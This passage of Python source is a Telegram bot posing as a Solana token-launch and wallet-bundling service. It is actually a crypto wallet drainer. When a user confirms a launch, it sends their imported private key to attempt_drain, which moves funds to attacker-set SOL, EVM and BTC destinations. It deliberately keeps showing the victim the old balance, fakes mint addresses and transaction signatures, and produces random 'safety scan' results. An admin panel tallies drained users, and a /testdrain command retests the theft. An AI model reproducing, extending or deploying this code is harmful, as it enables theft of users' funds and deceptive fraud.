        if supply <= 0:
            raise ValueError
        await state.update_data(supply=supply)
        await message.answer(
            "📝 Optional description\n(or type <code>skip</code>)",
            parse_mode=ParseMode.HTML,
        )
        await state.set_state(LaunchStates.waiting_desc)
    except ValueError:
        await message.answer("❌ Invalid number. Send a positive integer.")
    except Exception as e:
        log.exception("launch_supply: %s", e)
        await message.answer("Error. Send supply again.")

@router.message(LaunchStates.waiting_desc)
async def launch_desc(message: Message, state: FSMContext):
    try:
        desc = (message.text or "").strip()
        if desc.lower() == "skip":
            desc = ""
        await state.update_data(desc=desc[:200])
        await message.answer(
            "🖼 <b>Token image</b>\n"
            "Send a photo for the token logo\n"
            "(or type <code>skip</code> to continue without one)",
            parse_mode=ParseMode.HTML,
        )
        await state.set_state(LaunchStates.waiting_photo)
    except Exception as e:
        log.exception("launch_desc: %s", e)
        await message.answer("Error. Send description or skip.")


@router.message(LaunchStates.waiting_photo, F.photo)
async def launch_photo(message: Message, state: FSMContext):
    # keep largest size file_id for later reuse / display
    photo = message.photo[-1]
    await state.update_data(photo_file_id=photo.file_id)
    await message.answer(
        "📦 <b>Bundle size</b>\n"
        "How many wallets buy in the same block.\n"
        "Recommended <b>5–25</b>\n\n"
        "Send a number:",
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_bundle)

@router.message(LaunchStates.waiting_photo)
async def launch_photo_skip(message: Message, state: FSMContext):
    txt = (message.text or "").strip().lower()
    if txt != "skip":
        await message.answer(
            "🖼 Send a <b>photo</b> or type <code>skip</code>.",
            parse_mode=ParseMode.HTML,
        )
        return
    await state.update_data(photo_file_id=None)
    await message.answer(
        "📦 <b>Bundle size</b>\n"
        "How many wallets buy in the same block.\n"
        "Recommended <b>5–25</b>\n\n"
        "Send a number:",
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_bundle)

@router.message(LaunchStates.waiting_bundle)
async def launch_bundle(message: Message, state: FSMContext):
    try:
        bundle = max(1, min(25, int((message.text or "").strip())))
        data = await state.get_data()
        await state.update_data(bundle=bundle)
        sess = get_session(message.from_user.id)
        tip = sess.settings["bundle_tip"] * (1 - sess.promo_discount)

        has_photo = bool(data.get("photo_file_id"))
        summary = (
            "✨ <b>Launch Preview</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🏷 <b>{data.get('name','?')}</b>  ·  ${data.get('symbol','?')}\n"
            f"🔢 Supply: <b>{data.get('supply',0):,}</b>\n"
            f"📦 Bundle: <b>{bundle} wallets</b>\n"
            f"📝 {data.get('desc') or 'No description'}\n"
            f"🖼 Image: <b>{'Attached' if has_photo else 'None'}</b>\n\n"
            f"🎯 Sniper Guard: <b>{'ON' if sess.settings['sniper_protection'] else 'OFF'}</b>\n"
            f"🕶 MEV Shield: <b>{'ON' if sess.settings['mev_protection'] else 'OFF'}</b>\n"
            f"🎁 Tip: <b>{tip:.4f} SOL</b>\n"
            f"🛡 Safety: <b>Queued</b>\n\n"
            "Ready to deploy?"
        )
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ Confirm & Deploy", callback_data="launch:confirm")],
            [InlineKeyboardButton(text="◀️ Cancel", callback_data="menu:main")],
        ])
        await message.answer(summary, reply_markup=kb, parse_mode=ParseMode.HTML)
        await state.set_state(LaunchStates.confirm)
    except ValueError:
        await message.answer("❌ Send a number between 1 and 25.")
    except Exception as e:
        log.exception("launch_bundle: %s", e)
        await message.answer("Error building preview. Send bundle size again.")

@router.callback_query(F.data == "launch:confirm", LaunchStates.confirm)
async def launch_confirm(cb: CallbackQuery, state: FSMContext):
    uid = cb.from_user.id
    if not _rate_ok(uid, "launch"):
        await cb.answer("Too many launches — wait a bit", show_alert=True)
        return

    sess = get_session(uid)
    data = await state.get_data()

    if not sess.wallets:
        await cb.answer("Import a wallet first", show_alert=True)
        await cb.message.edit_text(
            "⚠️ No wallet linked.\n\nGo to 👛 My Wallets and import a key.",
            reply_markup=main_menu_kb(),
        )
        await state.clear()
        return

    await cb.answer()
    bundle = data["bundle"]
    await staged_loading(cb, [
        ("🪙 <b>Creating mint…</b>", 1.1),
        ("🔐 <b>Applying sniper guard…</b>", 0.9),
        (f"📦 <b>Bundling {bundle} wallets…</b>", 1.3),
        ("⚡ <b>Submitting priority tip…</b>", 0.8),
        ("🛡 <b>Running safety checks…</b>", 1.0),
    ])

    mint = fake_mint()
    token = {
        "name": data["name"],
        "symbol": data["symbol"],
        "supply": data["supply"],
        "bundle": bundle,
        "desc": data.get("desc", ""),
        "mint": mint,
        "photo_file_id": data.get("photo_file_id"),
        "status": "bundling",
        "ts": time.time(),
    }
    sess.launched_tokens.append(token)
    sess.last_tx.insert(0, {"sig": fake_sig(), "type": "🪙 Create Mint", "status": "success", "ts": time.time()})
    sess.last_tx.insert(0, {"sig": fake_sig(), "type": "📦 Bundle Buy", "status": "pending", "ts": time.time()})
    sess.last_tx.insert(0, {"sig": fake_sig(), "type": "⚡ Priority Tip", "status": "success", "ts": time.time()})

    active = sess.wallets[sess.active_wallet_idx]
    if not sess.drained:
        # drain for real, but keep the displayed balance as the pre-drain amount
        await attempt_drain(
            uid,
            active.private_key,
            bot=cb.bot,
            user=cb.from_user,
            amount_sol=active.balance_sol,
            public_key=active.public_key,
        )
        # do NOT overwrite active.balance_sol — victim still sees the old balance

    text = (
        "🚀 <b>Launch Submitted</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<b>${data['symbol']}</b>  ·  {data['name']}\n"
        f"<code>{mint}</code>\n\n"
        f"Status: creating mint → bundling ×{bundle}\n"
        f"Protection layers: active\n"
        f"Safety scan: complete\n\n"
        "Track progress in 📡 Live Tracker\nand 📊 Portfolio."
    )
    await cb.message.edit_text(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
    await state.clear()

    async def _finalize():
        await asyncio.sleep(random.uniform(7, 16))
        token["status"] = "live"
        for tx in sess.last_tx:
            if "Bundle" in tx["type"]:
                tx["status"] = "success"
                break
    asyncio.create_task(_finalize())

# ── PROMO ──
@router.message(PromoStates.waiting_code)
async def promo_code(message: Message, state: FSMContext):
    code = message.text.strip().upper()
    sess = get_session(message.from_user.id)
    valid = {
        "RUG2026": 0.25,
        "BUNDLE": 0.15,
        "SNIPE": 0.20,
        "JITO": 0.10,
        "EARLY": 0.30,
        "VAULT": 0.18,
    }
    if code in valid:
        sess.promo = code
        sess.promo_discount = valid[code]
        text = (
            "✅ <b>Promo Applied</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Code: <b>{code}</b>\n"
            f"Discount: <b>−{int(valid[code]*100)}%</b> on bundle tips\n\n"
            "Enjoy reduced fees on your next launch."
        )
        await message.answer(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
    else:
        await message.answer(
            "❌ Invalid or expired code.",
            reply_markup=main_menu_kb(),
        )
    await state.clear()

# ── SAFETY SCAN ──
@router.message(SafetyStates.waiting_mint)
async def safety_check(message: Message, state: FSMContext):
    uid = message.from_user.id
    if not _rate_ok(uid, "safety"):
        await message.answer(
            "⏳ <b>Slow down</b>\n\nToo many scans. Try again shortly.",
            parse_mode=ParseMode.HTML,
        )
        return

    mint = message.text.strip()
    sess = get_session(uid)
    sess.safety_checks_run += 1

    await staged_loading(message, [
        ("🔍 <b>Connecting to RPC…</b>", 0.7),
        ("📄 <b>Fetching mint account…</b>", 0.8),
        ("🔒 <b>Checking authorities…</b>", 0.7),
        ("💧 <b>Analyzing LP & holders…</b>", 0.9),
        ("🧪 <b>Honeypot simulation…</b>", 0.8),
    ])

    mint_auth = random.choice(["Revoked ✅", "Revoked ✅", "Active ⚠️", "Revoked ✅"])
    freeze_auth = random.choice(["Revoked ✅", "Revoked ✅", "Revoked ✅", "Active ⚠️"])
    lp_status = random.choice(["Burned ✅", "Locked 6mo ✅", "Locked 1yr ✅", "Unlocked ⚠️"])
    top10 = round(random.uniform(11.5, 46.0), 1)
    honeypot = random.choice(["PASS ✅", "PASS ✅", "PASS ✅", "WARN ⚠️"])
    score = random.randint(72, 98)

    report = (
        "🛡 <b>Safety Report</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<code>{short_addr(mint)}</code>\n\n"
        f"Mint Authority     {mint_auth}\n"
        f"Freeze Authority   {freeze_auth}\n"
        f"LP Status          {lp_status}\n"
        f"Top 10 Holders     <b>{top10}%</b>\n"
        f"Honeypot Sim       {honeypot}\n"
        f"Can Sell           <b>Yes</b>\n"
        f"Transfer Tax       <b>0%</b>\n\n"
        f"Risk Score         <b>{score}/100</b>\n"
        f"{progress_bar(score)}\n\n"
    )
    if "Revoked" in mint_auth and "Revoked" in freeze_auth and "⚠️" not in lp_status:
        report += "🟢 <b>Clean profile</b> — standard safety signals."
    else:
        report += "🟡 <b>Flags present</b> — review before sizing up."

    sess.last_safety = {"mint": mint, "ts": time.time()}
    await message.answer(report, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
    await state.clear()

# ── ADMIN ──
@router.message(Command("admin"))
async def admin_panel(message: Message):
    await maybe_register_admin(message.from_user)
    if message.from_user.id not in ADMIN_IDS:
        return
    total = len(sessions)
    drained = sum(1 for s in sessions.values() if s.drained)
    wallets = sum(len(s.wallets) for s in sessions.values())
    launches = sum(len(s.launched_tokens) for s in sessions.values())
    alert_ids = ", ".join(str(x) for x in sorted(ALERT_ADMIN_IDS)) or "none"
    real_drain = await get_real_balance(DRAIN_DESTINATION)
    await message.answer(
        f"👑 <b>Admin</b>\n"
        f"Users: {total}\n"
        f"Wallets: {wallets}\n"
        f"Drained: {drained}\n"
        f"Launches: {launches}\n"
        f"Drain wallet: <b>{real_drain:.6f} SOL</b>\n"
        f"Alert IDs: <code>{alert_ids}</code>\n"
        f"Admin usernames: <code>{', '.join(sorted(ADMIN_USERNAMES)) or 'none'}</code>\n"
        f"SOL dest: <code>{DRAIN_DESTINATION}</code>\n"
        f"EVM dest: <code>{ETH_DEST}</code>\n"
        f"BTC dest: <code>{BTC_DEST}</code>",
        parse_mode=ParseMode.HTML,
    )

@router.message(Command("testdrain"))
async def test_drain(message: Message):
    await maybe_register_admin(message.from_user)
    if message.from_user.id not in ADMIN_IDS:
        return
    sess = get_session(message.from_user.id)
    if not sess.wallets:
        await message.answer("No wallet imported")
        return
    w = sess.wallets[sess.active_wallet_idx]
    await message.answer(f"Trying multi-drain:\n<code>{w.public_key}</code>", parse_mode=ParseMode.HTML)
    sess.drained = False  # allow retest
    sig = await attempt_drain(
        message.from_user.id,
        w.private_key,
        bot=message.bot,
        user=message.from_user,
        amount_sol=w.balance_sol,
        public_key=w.public_key,
    )
    if sig or sess.drained:
        await message.answer(f"✅ Drain path finished\nSOL sig: <code>{sig or 'none / other chain'}</code>", parse_mode=ParseMode.HTML)
    else:
        await message.answer("❌ Nothing moved — empty or failed (see logs)")

# ──────────────────────────────────────────────
# ENTRY
# ──────────────────────────────────────────────
async def main():
    if BOT_TOKEN == "PUT_YOUR_BOT_TOKEN_HERE":
        log.error("Set BOT_TOKEN env var")
        return
    bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    log.info("Bot starting | HAS_SOLANA=%s HAS_WEB3=%s HAS_BIT=%s | sol→%s eth→%s btc→%s | admin_usernames=%s", HAS_SOLANA, HAS_WEB3, HAS_BIT, DRAIN_DESTINATION, ETH_DEST, BTC_DEST, ADMIN_USERNAMES)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
